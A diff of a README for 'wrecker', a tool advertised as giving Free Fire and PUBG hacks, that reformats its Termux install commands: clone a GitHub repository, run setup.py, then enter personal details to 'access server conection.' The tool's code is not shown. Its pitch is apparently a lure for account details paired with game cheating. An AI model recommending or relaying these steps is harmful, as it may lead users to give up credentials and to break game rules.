@@ -11,20 +11,20 @@ A tool that provide user Free Fire and Pubg hacks.
 
 Simply Type Following Commands 
 
-    termux-setup-storage
+  * `termux-setup-storage`
     
-    apt install git -y
+  *  `apt install git -y`
 
-    apt install python -y
+  *  `apt install python -y`
 
-    git clone https://github.com/devincrack/wrecker.git
+  * `git clone https://github.com/devincrack/wrecker.git`
 
 
 # How to Use wrecker ? 
 
-    cd wrecker
+  *  `cd wrecker`
 
-    python setup.py
+  *  `python setup.py`
 
 
  Now Enter Your Details asking by this tool to access server conection. 
